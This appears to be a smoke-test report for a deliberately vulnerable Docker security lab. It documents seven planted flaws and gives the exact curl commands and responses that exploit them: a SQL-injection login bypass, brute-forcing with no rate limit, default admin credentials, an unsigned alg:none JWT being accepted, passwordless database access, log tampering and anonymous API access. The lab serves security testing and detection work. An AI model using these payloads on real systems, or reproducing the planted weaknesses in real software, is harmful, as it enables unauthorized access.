# Phase 4 — Manual Smoke Testing Results

**Execution Date:** 2026-08-02  
**Target Environment:** Local Docker Compose isolated network (`sentinelmesh_net`)  
**Status:** ALL 7 SMOKE TESTS PASSED (100%)

---

## Results Summary Matrix

| # | Vulnerability Scenario | Target Service | Result | Evidence / Response |
|---|------------------------|----------------|--------|---------------------|
| 1 | SQL Injection in `/login` | `webapp` | **PASS** | `HTTP 200 OK` — Auth bypassed via `admin' OR 1=1 --` |
| 2 | Missing Rate Limiting | `webapp` | **PASS** | `50/50 HTTP 401` — Zero throttling (`429`) or account lockout |
| 3 | Default Credentials (`admin/admin123`) | `authservice` | **PASS** | `HTTP 200 OK` — Valid JWT returned for default admin creds |
| 4 | JWT Algorithm Confusion | `authservice` | **PASS** | `HTTP 200 OK` — `alg: none` token accepted as valid payload |
| 5 | Passwordless DB Access | `database` | **PASS** | `psql` succeeded without password prompt via `trust` policy |
| 6 | World-Writable Log Path | `logcollector` | **PASS** | Log entry appended into `/var/log/sentinelmesh/app.log` from `webapp` |
| 7 | Anonymous Dashboard Access | `dashboard` | **PASS** | `HTTP 200 OK` — `api/org` returned organization payload anonymously |

---

## Detailed Test Logs & Execution Evidence

### Test 1: SQL Injection — `webapp` (`/login`)
- **CWE:** CWE-89
- **Command Executed:**
  ```bash
  curl -s -X POST http://127.0.0.1:5000/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin'\'' OR 1=1 --", "password": "anything"}'
  ```
- **Response HTTP Code:** `200 OK`
- **Response Body:**
  ```json
  {
    "message": "Login successful",
    "status": "success",
    "user": {
      "id": 1,
      "role": "user",
      "username": "testuser"
    }
  }
  ```
- **Verdict:** **PASS** — Authentication bypassed without knowing user password.

---

### Test 2: Missing Rate Limiting — `webapp` (`/login`)
- **CWE:** CWE-307
- **Command Executed:**
  ```bash
  for i in $(seq 1 50); do
    curl -s -o /dev/null -w "%{http_code}\n" -X POST http://127.0.0.1:5000/login \
      -H "Content-Type: application/json" \
      -d "{\"username\": \"admin\", \"password\": \"wrong$i\"}"
  done
  ```
- **Response Summary:** 50 out of 50 requests returned `401 Unauthorized`. 0 requests returned `429 Too Many Requests`.
- **Verdict:** **PASS** — Endpoint processed rapid brute-force attempts with zero throttling or delay.

---

### Test 3: Default Credentials — `authservice` (`/auth/login`)
- **CWE:** CWE-798
- **Command Executed:**
  ```bash
  curl -s -X POST http://127.0.0.1:5001/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "admin123"}'
  ```
- **Response HTTP Code:** `200 OK`
- **Response Body:**
  ```json
  {
    "status": "success",
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.ezSvMlMH_bJsBfMe78S969TFZyq2qL_-kMR5etAZLGA"
  }
  ```
- **Verdict:** **PASS** — Pre-seeded default admin credentials authenticated successfully.

---

### Test 4: JWT Algorithm Confusion — `authservice` (`/auth/verify`)
- **CWE:** CWE-327 / CVE-2022-29217
- **Command Executed:**
  ```bash
  curl -s -X POST http://127.0.0.1:5001/auth/verify \
    -H "Content-Type: application/json" \
    -d '{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."}'
  ```
- **Response HTTP Code:** `200 OK`
- **Response Body:**
  ```json
  {
    "status": "valid",
    "payload": {
      "user_id": 1,
      "username": "admin",
      "role": "admin"
    }
  }
  ```
- **Verdict:** **PASS** — Unsigned token header using `alg: none` was accepted as valid.

---

### Test 5: Passwordless DB Access — `database`
- **CWE:** CWE-284
- **Command Executed:**
  ```bash
  docker compose exec database psql -U postgres -d sentinelmesh -c "SELECT id, username, role FROM users;"
  ```
- **Output:**
  ```
   id | username | role  
  ----+----------+-------
    1 | testuser | user
    2 | admin    | admin
  (2 rows)
  ```
- **Verdict:** **PASS** — PostgreSQL granted full database query access without prompting for password.

---

### Test 6: World-Writable Log Path — `logcollector`
- **CWE:** CWE-732
- **Command Executed:**
  ```bash
  docker compose exec webapp sh -c 'echo "FAKE LOG ENTRY" >> /var/log/sentinelmesh/app.log'
  docker compose exec logcollector cat /var/log/sentinelmesh/app.log
  ```
- **Output:**
  ```
  FAKE LOG ENTRY
  ```
- **Verdict:** **PASS** — Shared volume mount permissions (`777`) allowed arbitrary non-logcollector container to tamper with logs.

---

### Test 7: Anonymous Dashboard Access — `dashboard`
- **CWE:** CWE-798 / CWE-306
- **Command Executed:**
  ```bash
  curl -s http://127.0.0.1:3000/api/org
  ```
- **Response HTTP Code:** `200 OK`
- **Response Body:**
  ```json
  {
    "id": 1,
    "name": "Main Org.",
    "address": {
      "address1": "",
      "address2": "",
      "city": "",
      "zipCode": "",
      "state": "",
      "country": ""
    }
  }
  ```
- **Verdict:** **PASS** — Grafana organization API responded anonymously without authentication.

---

### Addendum: Structured Security Event Logging Verification (2026-08-04)

All app-layer exploit scenarios (S1, S2, S3, S4) were re-triggered after the PRD addendum implementation. Log output was verified from the live containers:

- **Webapp log** (`/var/log/sentinelmesh/webapp_events.log`):
  - `login_attempt` / `success` — SQL injection bypass (`admin' OR 1=1 --`) ✅
  - `login_attempt` / `failure` — Invalid credentials ✅

- **Authservice log** (`/var/log/sentinelmesh/auth_events.log`):
  - `login_attempt` / `success` — Default credentials (`admin / admin123`) ✅
  - `login_attempt` / `failure` — Wrong password ✅
  - `jwt_verification` / `valid` — Algorithm confusion (`alg: none`) ✅
  - `jwt_verification` / `invalid` — Garbage token rejected ✅

All log entries are valid JSON-lines with required schema fields: `timestamp`, `service`, `event_type`, `result`, `identifier`, `client_ip`, `details`.

**Verdict:** **PASS** — Structured logging verified for all app-layer scenarios.

---

## Conclusion

All 7 planted vulnerabilities are confirmed **real and fully exploitable** in the live Docker environment. Structured security event logging is verified for all app-layer scenarios (S1–S4). The lab infrastructure is now fully verified and ready for Day 4 attack script integration.
